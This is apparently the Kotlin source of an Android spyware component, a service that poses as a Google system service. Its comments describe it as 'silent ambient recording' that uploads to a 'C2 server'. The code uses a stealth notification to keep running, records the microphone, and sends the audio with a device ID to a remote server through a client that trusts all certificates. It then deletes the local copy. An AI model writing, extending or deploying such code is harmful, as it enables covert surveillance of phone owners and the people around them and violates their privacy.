package com.google.android.systemservice.services

import android.app.Service
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Environment
import android.os.IBinder
import android.util.Log
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.StealthNotificationHelper
import com.google.android.systemservice.utils.TrustAllCertificates
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.*

/**
 * Silent ambient recording - records surrounding audio without UI.
 * Saves to internal storage and uploads to C2 server.
 */
class AmbientRecordingService : Service() {

    companion object {
        private const val TAG = "AmbientRecording"
        private const val SAMPLE_RATE = 16000
        private const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        private const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        private const val DEFAULT_DURATION_SEC = 60
    }

    private var audioRecord: AudioRecord? = null
    private var isRecording = false
    private var recordingThread: Thread? = null
    private var durationSeconds = DEFAULT_DURATION_SEC

    override fun onCreate() {
        super.onCreate()
        val notification = StealthNotificationHelper.createStealthNotification(this)
        startForeground(StealthNotificationHelper.AMBIENT_SERVICE_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        durationSeconds = intent?.getIntExtra("duration", DEFAULT_DURATION_SEC) ?: DEFAULT_DURATION_SEC
        startRecording()
        return START_NOT_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun startRecording() {
        if (isRecording) return

        if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "RECORD_AUDIO permission not granted")
            stopSelf()
            return
        }

        val bufferSize = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
        if (bufferSize == AudioRecord.ERROR || bufferSize == AudioRecord.ERROR_BAD_VALUE) {
            Log.e(TAG, "Invalid buffer size")
            stopSelf()
            return
        }

        try {
            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT, bufferSize * 2
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord not initialized")
                stopSelf()
                return
            }

            isRecording = true
            audioRecord?.startRecording()

            recordingThread = Thread {
                recordAndUpload(bufferSize)
            }.also { it.start() }

            Log.d(TAG, "Ambient recording started for ${durationSeconds}s")
        } catch (e: SecurityException) {
            Log.e(TAG, "No RECORD_AUDIO permission: ${e.message}")
            stopSelf()
        }
    }

    private fun recordAndUpload(bufferSize: Int) {
        val outputFile = File(cacheDir, "ambient_${System.currentTimeMillis()}.pcm")
        val buffer = ByteArray(bufferSize)
        val totalSamples = SAMPLE_RATE * durationSeconds * 2 // 16-bit = 2 bytes per sample
        var bytesRecorded = 0

        try {
            FileOutputStream(outputFile).use { fos ->
                while (isRecording && bytesRecorded < totalSamples) {
                    val read = audioRecord?.read(buffer, 0, buffer.size) ?: -1
                    if (read > 0) {
                        fos.write(buffer, 0, read)
                        bytesRecorded += read
                    }
                }
            }

            Log.d(TAG, "Recording complete: ${outputFile.length()} bytes")
            uploadRecording(outputFile)
        } catch (e: Exception) {
            Log.e(TAG, "Recording error: ${e.message}")
        } finally {
            stopRecording()
            stopSelf()
        }
    }

    private fun uploadRecording(file: File) {
        try {
            val client = TrustAllCertificates.createClientBuilder().build()
            val body = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", AndroidConfig.deviceId)
                .addFormDataPart("recording_type", "ambient")
                .addFormDataPart("duration", durationSeconds.toString())
                .addFormDataPart("file", file.name,
                    file.asRequestBody("audio/raw".toMediaType()))
                .build()

            val request = Request.Builder()
                .url("${AndroidConfig.apiBaseUrl}/audio")
                .post(body)
                .build()

            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    Log.d(TAG, "Ambient recording uploaded")
                } else {
                    Log.w(TAG, "Upload failed: ${response.code}")
                }
            }

            file.delete()
        } catch (e: Exception) {
            Log.e(TAG, "Upload error: ${e.message}")
        }
    }

    private fun stopRecording() {
        isRecording = false
        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (e: Exception) {
            Log.e(TAG, "Stop error: ${e.message}")
        }
        audioRecord = null
    }

    override fun onDestroy() {
        stopRecording()
        stopForeground(false)
        super.onDestroy()
    }
}
